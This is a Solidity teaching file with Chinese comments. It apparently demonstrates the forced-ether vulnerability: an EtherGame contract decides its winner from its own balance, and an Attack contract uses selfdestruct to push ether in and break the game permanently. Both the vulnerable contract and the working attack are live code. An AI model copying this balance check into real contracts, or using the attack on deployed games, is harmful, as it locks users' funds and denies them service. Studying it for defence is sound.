// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

// 这个游戏的目标是成为第七个存入1个以太的玩家。
// 玩家每次只能存入1个以太。
// 获胜者将能够提取所有以太。

/*
1. 部署EtherGame
2. 玩家（例如Alice和Bob）决定玩游戏，每人存入1个以太。
3. 部署攻击程序，并指定EtherGame的地址。
4. 调用Attack.attack函数，发送5个以太。这将破坏游戏，没有人能成为赢家。

发生了什么？
攻击导致EtherGame的平衡被强制设置为7个以太。
现在没有人能够存款，也无法设定获胜者。
*/

contract EtherGame {
    uint public targetAmount = 7 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint balance = address(this).balance;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
        // 你可以通过发送以太来轻松破坏游戏，以此来达到作弊的目的。
        // 游戏余额 >= 7 以太

        // 转换地址为可支付地址
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}
